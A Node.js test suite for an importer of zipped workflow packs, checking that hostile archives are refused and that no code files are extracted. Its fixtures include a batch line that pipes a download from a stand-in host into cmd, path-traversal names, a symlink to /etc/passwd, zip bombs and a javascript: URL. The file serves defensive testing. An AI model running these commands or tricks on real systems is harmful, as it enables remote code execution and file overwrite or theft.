// Shared pack import (electron/packImport.cjs): hostile zips (traversal,
// links, zip bombs, lying sizes, huge file counts) and real-shaped packs
// (a Seedance long-video kit with a Chrome extension, a .dspack).
const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const zlib = require('node:zlib')

const packs = require('../electron/packImport.cjs')

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ds-pack-import-'))
test.after(() => fs.rmSync(tmp, { recursive: true, force: true }))

let counter = 0
const freshDir = (label) => {
  const dir = path.join(tmp, `${label}-${counter += 1}`)
  fs.mkdirSync(dir, { recursive: true })
  return dir
}

/**
 * Minimal zip writer for fixtures. Per entry: name, data, deflate, unixMode
 * (sets "made by Unix" + mode bits, e.g. 0o120777 for a symlink), flags
 * (general-purpose bits, 0x1 = encrypted) and declaredSize (a lying
 * uncompressed size).
 */
function buildZip(files) {
  const locals = []
  const centrals = []
  let offset = 0
  for (const { name, data = '', deflate = false, unixMode = null, flags = 0, declaredSize = null } of files) {
    const raw = Buffer.isBuffer(data) ? data : Buffer.from(data)
    const body = deflate ? zlib.deflateRawSync(raw) : raw
    const nameBuf = Buffer.from(name, 'utf8')
    const crc = zlib.crc32(raw)
    const size = declaredSize ?? raw.length
    const gp = 0x0800 | flags
    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(gp, 6)
    local.writeUInt16LE(deflate ? 8 : 0, 8); local.writeUInt32LE(crc, 14)
    local.writeUInt32LE(body.length, 18); local.writeUInt32LE(size, 22); local.writeUInt16LE(nameBuf.length, 26)
    locals.push(local, nameBuf, body)
    const central = Buffer.alloc(46)
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(unixMode == null ? 20 : 0x0314, 4); central.writeUInt16LE(20, 6)
    central.writeUInt16LE(gp, 8); central.writeUInt16LE(deflate ? 8 : 0, 10); central.writeUInt32LE(crc, 16)
    central.writeUInt32LE(body.length, 20); central.writeUInt32LE(size, 24); central.writeUInt16LE(nameBuf.length, 28)
    if (unixMode != null) central.writeUInt32LE(((unixMode & 0xffff) << 16) >>> 0, 38)
    central.writeUInt32LE(offset, 42)
    centrals.push(central, nameBuf)
    offset += local.length + nameBuf.length + body.length
  }
  const centralBuf = Buffer.concat(centrals)
  const end = Buffer.alloc(22)
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(files.length, 8); end.writeUInt16LE(files.length, 10)
  end.writeUInt32LE(centralBuf.length, 12); end.writeUInt32LE(offset, 16)
  return Buffer.concat([...locals, centralBuf, end])
}

const writeZip = (name, files) => {
  const file = path.join(freshDir('zip'), name)
  fs.writeFileSync(file, buildZip(files))
  return file
}

/** Every file under `dir`, relative, with forward slashes. */
function walk(dir, base = dir) {
  if (!fs.existsSync(dir)) return []
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const full = path.join(dir, entry.name)
    return entry.isDirectory() ? walk(full, base) : [path.relative(base, full).split(path.sep).join('/')]
  })
}

const PNG = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8ffff3f0005fe02fea7d6a5d80000000049454e44ae426082', 'hex')
const API_WORKFLOW = JSON.stringify({
  3: { class_type: 'KSampler', inputs: { seed: 1, model: ['4', 0] } },
  4: { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'seedance_helper.safetensors' } },
  9: { class_type: 'SaveVideo', inputs: { filename_prefix: 'long' } },
})
const UI_WORKFLOW = JSON.stringify({
  last_node_id: 3, last_link_id: 1, version: 0.4,
  nodes: [
    { id: 1, type: 'LoadImage', widgets_values: ['ref.png'] },
    { id: 2, type: 'WanImageToVideo', widgets_values: [] },
    { id: 3, type: 'Note', widgets_values: ['chain shots here'] },
  ],
  links: [[1, 1, 0, 2, 0, 'IMAGE']],
})
const CHROME_MANIFEST = JSON.stringify({
  manifest_version: 3,
  name: 'Seedance Long Video Helper',
  description: 'Chains Seedance clips into a 240s video and bypasses the 10 s limit. Unlimited free credits.',
  background: { service_worker: 'background.js' },
  action: { default_popup: 'popup.html' },
})

function seedanceKit() {
  const top = 'Seedance 240s Long Video Kit'
  return writeZip('seedance-kit.zip', [
    { name: `${top}/`, data: '' },
    { name: `${top}/README.md`, data: '# Seedance 240s\nChain 24 Seedance shots into one long video.\n' },
    { name: `${top}/workflows/seedance_long_api.json`, data: API_WORKFLOW, deflate: true },
    { name: `${top}/workflows/long_shot_ui.json`, data: UI_WORKFLOW },
    { name: `${top}/workflows/settings.json`, data: '{"fps": 24, "shots": 24}' },
    { name: `${top}/prompts/shot_list.csv`, data: 'shot,prompt\n1,a city at dawn\n' },
    { name: `${top}/prompts/style.txt`, data: 'cinematic, 35mm, soft light' },
    { name: `${top}/refs/hero.png`, data: PNG },
    { name: `${top}/luts/teal_orange.cube`, data: 'LUT_3D_SIZE 2\n0 0 0\n1 0 0\n0 1 0\n1 1 0\n0 0 1\n1 0 1\n0 1 1\n1 1 1\n' },
    { name: `${top}/extension/manifest.json`, data: CHROME_MANIFEST },
    { name: `${top}/extension/background.js`, data: 'chrome.runtime.onInstalled.addListener(() => {})' },
    { name: `${top}/extension/popup.html`, data: '<script src="popup.js"></script>' },
    { name: `${top}/extension/icons/icon128.png`, data: PNG },
    { name: `${top}/extension/_locales/en/messages.json`, data: '{"name":{"message":"x"}}' },
    { name: `${top}/tools/install.bat`, data: '@echo off\ncurl http://example.invalid | cmd' },
    { name: `${top}/tools/setup.exe`, data: 'MZ' },
    { name: `${top}/custom_nodes/chain/__init__.py`, data: 'import os' },
    { name: `${top}/models/helper.ckpt`, data: 'pickle' },
    { name: `${top}/more.zip`, data: buildZip([{ name: 'inner.txt', data: 'x' }]) },
    { name: `${top}/.DS_Store`, data: 'x' },
    { name: '__MACOSX/._README.md', data: 'x' },
  ])
}

test('a real-shaped Seedance kit is classified; code is listed but never written', async () => {
  const dir = freshDir('session')
  const { result, items } = await packs.inspectPackFile(seedanceKit(), dir)

  assert.equal(result.name, 'Seedance 240s Long Video Kit')
  assert.equal(result.isDsPack, false)
  assert.match(result.readme.text, /Chain 24 Seedance shots/)

  const workflows = Object.fromEntries(result.workflows.map((item) => [item.name, item]))
  assert.deepEqual(Object.keys(workflows).sort(), ['long_shot_ui.json', 'seedance_long_api.json'])
  assert.equal(workflows['seedance_long_api.json'].format, 'api')
  assert.equal(workflows['seedance_long_api.json'].nodeCount, 3)
  assert.deepEqual(workflows['seedance_long_api.json'].nodeTypes, ['KSampler', 'CheckpointLoaderSimple', 'SaveVideo'])
  assert.equal(workflows['long_shot_ui.json'].format, 'ui')
  assert.deepEqual(workflows['long_shot_ui.json'].nodeTypes, ['LoadImage', 'WanImageToVideo'])
  assert.equal(workflows['seedance_long_api.json'].title, 'seedance long api')

  const templates = Object.fromEntries(result.templates.map((item) => [item.name, item.subtype]))
  assert.deepEqual(templates, { 'settings.json': 'json', 'shot_list.csv': 'shot-list', 'style.txt': 'prompt' })

  const media = Object.fromEntries(result.media.map((item) => [item.name, item.mediaType]))
  assert.deepEqual(media, { 'hero.png': 'image', 'teal_orange.cube': 'lut' }, 'extension icons are not offered as media')

  const groups = Object.fromEntries(result.code.map((group) => [group.type, group]))
  assert.deepEqual(Object.keys(groups).sort(), ['chrome-extension', 'program', 'python', 'windows-script'])
  assert.equal(groups['chrome-extension'].name, 'Seedance Long Video Helper')
  assert.equal(groups['chrome-extension'].fileCount, 5)
  assert.ok(groups['chrome-extension'].patterns.includes('long-video'))
  assert.ok(groups['chrome-extension'].patterns.includes('limit-bypass'))
  assert.deepEqual(groups['windows-script'].patterns, [], 'loose scripts do not repeat the pack-level tips')
  assert.ok(!result.toolPatterns.includes('long-video'), 'already shown on the extension')

  const reasons = Object.fromEntries(result.skipped.map((item) => [path.posix.basename(item.path), item.reason]))
  assert.equal(reasons['helper.ckpt'], 'model')
  assert.equal(reasons['more.zip'], 'archive')
  assert.equal(reasons['.DS_Store'], undefined, 'junk files are ignored quietly')

  const onDisk = walk(dir)
  assert.ok(onDisk.length > 0)
  for (const file of onDisk) {
    assert.doesNotMatch(file, /\.(js|bat|exe|py|html|ckpt|zip)$|extension\//, `${file} must not be extracted`)
  }
  for (const item of items.values()) assert.ok(item.absolutePath.startsWith(path.join(dir, 'files') + path.sep))
})

test('a .dspack manifest names the pack and its items, and covers become thumbnails', async () => {
  const manifest = {
    format: 'dspack',
    formatVersion: 1,
    name: 'Rainy Noir Shots',
    author: 'Mika',
    version: '1.2.0',
    license: 'CC-BY-4.0',
    homepage: 'javascript:alert(1)',
    contents: [
      { path: 'workflows/noir.json', type: 'workflow', title: 'Noir rain shot', description: 'Wet streets at night.', cover: 'covers/noir.png' },
      { path: 'prompts/noir.md', type: 'template', title: 'Noir prompt set' },
      { path: 'run.js', type: 'workflow', title: 'Not a workflow' },
    ],
  }
  const zip = writeZip('noir.dspack', [
    { name: 'manifest.json', data: JSON.stringify(manifest) },
    { name: 'workflows/noir.json', data: API_WORKFLOW },
    { name: 'prompts/noir.md', data: 'rain, neon, reflections' },
    { name: 'covers/noir.png', data: PNG },
    { name: 'run.js', data: 'require("child_process")' },
  ])
  const importer = packs.createPackImporter({ tempRoot: freshDir('temp'), getUserDataDir: () => freshDir('userdata') })
  const result = await importer.inspect(zip)
  assert.equal(result.ok, true, result.error)
  assert.equal(result.isDsPack, true)
  assert.deepEqual(result.manifest, { name: 'Rainy Noir Shots', author: 'Mika', version: '1.2.0', license: 'CC-BY-4.0', description: '', homepage: '' })
  assert.equal(result.workflows.length, 1)
  assert.equal(result.workflows[0].title, 'Noir rain shot')
  assert.equal(result.workflows[0].description, 'Wet streets at night.')
  assert.ok(result.workflows[0].coverId)
  assert.equal(result.media.length, 0, 'the cover is not offered as an asset')
  assert.equal(result.templates[0].title, 'Noir prompt set')
  assert.deepEqual(result.code.map((group) => group.type), ['script'], 'a manifest cannot turn code into a workflow')

  const cover = await importer.readItem(result.packId, result.workflows[0].coverId)
  assert.equal(cover.kind, 'dataUrl')
  assert.match(cover.dataUrl, /^data:image\/png;base64,/)
  const workflow = await importer.readItem(result.packId, result.workflows[0].id)
  assert.equal(workflow.format, 'api')
  assert.equal(workflow.graph['4'].class_type, 'CheckpointLoaderSimple')
})

test('path traversal refuses the whole pack and writes nothing', async () => {
  for (const name of ['../../evil.txt', 'ok/../../evil.json', '..\\..\\evil.md', '/etc/evil.txt', 'C:/Windows/evil.txt', 'C:\\evil.txt']) {
    const parent = freshDir('traversal')
    const dir = path.join(parent, 'session')
    fs.mkdirSync(dir)
    const zip = writeZip('evil.zip', [{ name: 'fine.txt', data: 'ok' }, { name, data: 'pwned' }])
    await assert.rejects(packs.inspectPackFile(zip, dir), (error) => error.code === 'UNSAFE_PATH', name)
    assert.deepEqual(walk(parent), [], `nothing written for ${name}`)
  }
})

test('symlink and encrypted entries are skipped, never written', async () => {
  const dir = freshDir('session')
  const zip = writeZip('links.zip', [
    { name: 'link.txt', data: '../../../../etc/passwd', unixMode: 0o120777 },
    { name: 'link-dir/', data: '', unixMode: 0o040755 },
    // Traditional encryption: a 12-byte header precedes the 4 data bytes.
    { name: 'secret.txt', data: 'h'.repeat(12) + 'xxxx', flags: 0x1, declaredSize: 4 },
    { name: 'notes.txt', data: 'real notes', unixMode: 0o100644 },
  ])
  const { result } = await packs.inspectPackFile(zip, dir)
  const reasons = Object.fromEntries(result.skipped.map((item) => [item.path, item.reason]))
  assert.equal(reasons['link.txt'], 'link')
  assert.equal(reasons['secret.txt'], 'encrypted')
  assert.deepEqual(result.templates.map((item) => item.name), ['notes.txt'])
  assert.deepEqual(walk(dir), ['files/notes.txt'])
})

test('a zip bomb (huge ratio) is refused before anything is written', async () => {
  const dir = freshDir('session')
  const zip = writeZip('bomb.zip', [{ name: 'bomb.txt', data: Buffer.alloc(32 * 1024 * 1024), deflate: true }])
  await assert.rejects(packs.inspectPackFile(zip, dir), (error) => error.code === 'ZIP_BOMB')
  assert.deepEqual(walk(dir), [])
})

test('an entry that lies about its size is caught while reading', async () => {
  const dir = freshDir('session')
  const zip = writeZip('liar.zip', [{ name: 'liar.png', data: Buffer.alloc(200 * 1024, 7), deflate: true, declaredSize: 100 }])
  await assert.rejects(packs.inspectPackFile(zip, dir), (error) => error.code === 'ZIP_BOMB')
  const partial = walk(dir).map((file) => fs.statSync(path.join(dir, file)).size)
  assert.ok(partial.every((size) => size <= 100), 'never more than the declared bytes on disk')
})

test('size limits: per-file caps skip, total caps refuse', async () => {
  const zip = writeZip('big.zip', [
    { name: 'clip.mp4', data: Buffer.alloc(4096, 1) },
    { name: 'huge-notes.txt', data: Buffer.alloc(4096, 65) },
    { name: 'small.txt', data: 'ok' },
  ])
  const { result } = await packs.inspectPackFile(zip, freshDir('session'), { limits: { maxTextBytes: 1024 } })
  assert.deepEqual(result.skipped.map((item) => [item.path, item.reason]), [['huge-notes.txt', 'too-large']])
  assert.deepEqual(result.media.map((item) => item.name), ['clip.mp4'])
  await assert.rejects(packs.inspectPackFile(zip, freshDir('session'), { limits: { maxTotalBytes: 2048 } }), (error) => error.code === 'TOO_BIG')
})

test('huge file counts are refused from the end record', async () => {
  const files = Array.from({ length: packs.DEFAULT_LIMITS.maxEntries + 1 }, (_, i) => ({ name: `f/${i}.txt`, data: 'x' }))
  const zip = writeZip('many.zip', files)
  const dir = freshDir('session')
  await assert.rejects(packs.inspectPackFile(zip, dir), (error) => error.code === 'TOO_MANY_FILES')
  assert.deepEqual(walk(dir), [])
  await assert.rejects(packs.inspectPackFile(writeZip('few.zip', files.slice(0, 30)), freshDir('session'), { limits: { maxEntries: 20 } }),
    (error) => error.code === 'TOO_MANY_FILES')
})

test('not a zip, missing, or nothing usable', async () => {
  const fake = path.join(freshDir('fake'), 'fake.zip')
  fs.writeFileSync(fake, 'this is not a zip at all')
  await assert.rejects(packs.inspectPackFile(fake, freshDir('session')), (error) => error.code === 'NOT_ZIP')
  await assert.rejects(packs.inspectPackFile(path.join(tmp, 'missing.zip'), freshDir('session')), (error) => error.code === 'NOT_FOUND')
  const onlyModels = writeZip('models.zip', [{ name: 'a.safetensors', data: 'x' }, { name: 'b.pt', data: 'y' }])
  await assert.rejects(packs.inspectPackFile(onlyModels, freshDir('session')), (error) => error.code === 'EMPTY')
  const broken = writeZip('broken.zip', [{ name: 'flow.json', data: '{ not json' }])
  await assert.rejects(packs.inspectPackFile(broken, freshDir('session')), (error) => error.code === 'EMPTY')
})

test('importer sessions: read by id only, keep templates + readme, discard cleans up', async () => {
  const tempRoot = freshDir('temp')
  const userData = freshDir('userdata')
  const importer = packs.createPackImporter({ tempRoot, getUserDataDir: () => userData })

  assert.equal((await importer.inspect('relative/pack.zip')).code, 'NOT_ZIP')
  assert.equal((await importer.inspect(path.join(tmp, 'x.exe'))).code, 'NOT_ZIP')
  const failed = await importer.inspect(writeZip('evil.zip', [{ name: '../evil.txt', data: 'x' }]))
  assert.equal(failed.code, 'UNSAFE_PATH')
  assert.deepEqual(fs.readdirSync(tempRoot), [], 'a refused pack leaves no temp folder')

  const result = await importer.inspect(seedanceKit())
  assert.equal(result.ok, true)
  assert.equal(importer.sessionCount, 1)
  assert.equal((await importer.readItem(result.packId, 'i999')).code, 'NOT_IN_PACK')
  assert.equal((await importer.readItem('nope', result.workflows[0].id)).code, 'EXPIRED')
  const lut = await importer.readItem(result.packId, result.media.find((item) => item.mediaType === 'lut').id)
  assert.match(lut.text, /LUT_3D_SIZE 2/)

  const csv = result.templates.find((item) => item.name === 'shot_list.csv')
  const kept = await importer.keep(result.packId, { itemIds: [csv.id, result.workflows[0].id, 'c0'], imported: { workflows: 2, media: 1, 'bad key': 9 } })
  assert.equal(kept.ok, true, kept.error)
  assert.equal(path.dirname(kept.folder), path.join(userData, packs.KEPT_PACKS_DIR))
  assert.deepEqual(walk(kept.folder).sort(), [
    'Seedance 240s Long Video Kit/README.md',
    'Seedance 240s Long Video Kit/prompts/shot_list.csv',
    'pack.json',
  ], 'only templates and the readme are kept; workflow files go to My Workflows')
  const record = JSON.parse(fs.readFileSync(path.join(kept.folder, 'pack.json'), 'utf8'))
  assert.equal(record.source, 'seedance-kit.zip')
  assert.deepEqual(record.imported, { workflows: 2, media: 1 })
  assert.ok(record.notImported.some((group) => group.type === 'chrome-extension'))

  const again = await importer.keep(result.packId, { itemIds: [] })
  assert.notEqual(again.folder, kept.folder, 'a second import never overwrites the first')

  await importer.discard(result.packId)
  assert.equal(importer.sessionCount, 0)
  assert.deepEqual(fs.readdirSync(tempRoot), [])
  assert.equal((await importer.readItem(result.packId, result.workflows[0].id)).code, 'EXPIRED')
})

test('pure helpers', () => {
  assert.equal(packs.detectWorkflowFormat(JSON.parse(API_WORKFLOW)), 'api')
  assert.equal(packs.detectWorkflowFormat(JSON.parse(UI_WORKFLOW)), 'ui')
  assert.equal(packs.detectWorkflowFormat({ 1: { class_type: 'KSampler' }, note: 'x' }), null)
  assert.equal(packs.detectWorkflowFormat({ nodes: [], links: [] }), null)
  assert.equal(packs.detectWorkflowFormat([1, 2]), null)
  assert.equal(packs.parseDsPackManifest({ format: 'other' }), null)
  assert.equal(packs.parseDsPackManifest({ format: 'dspack', homepage: 'https://jepoy.dev/packs' }).homepage, 'https://jepoy.dev/packs')
  assert.deepEqual(packs.checkEntryPath('a/./b//c.txt'), { rel: 'a/b/c.txt' })
  assert.deepEqual(packs.checkEntryPath('CON.txt'), { skip: 'bad-name' })
  assert.deepEqual(packs.checkEntryPath('a/b?.txt'), { skip: 'bad-name' })
  assert.deepEqual(packs.checkEntryPath('__MACOSX/x'), { skip: 'ignored' })
  assert.throws(() => packs.checkEntryPath('a/../../b'), (error) => error.code === 'UNSAFE_PATH')
  assert.throws(() => packs.resolveInside(tmp, '../x'), (error) => error.code === 'UNSAFE_PATH')
  assert.deepEqual(packs.detectToolPatterns('Auto click generate for unlimited Seedance 240 s videos'), ['long-video', 'limit-bypass', 'automation'])
  assert.deepEqual(packs.detectToolPatterns('A color grading LUT pack'), [])
  assert.equal(packs.classifyByName('x/README').kind, 'readme')
  assert.equal(packs.classifyByName('setup.ps1').codeType, 'windows-script')
  assert.equal(packs.classifyByName('weights.safetensors').reason, 'model')
})
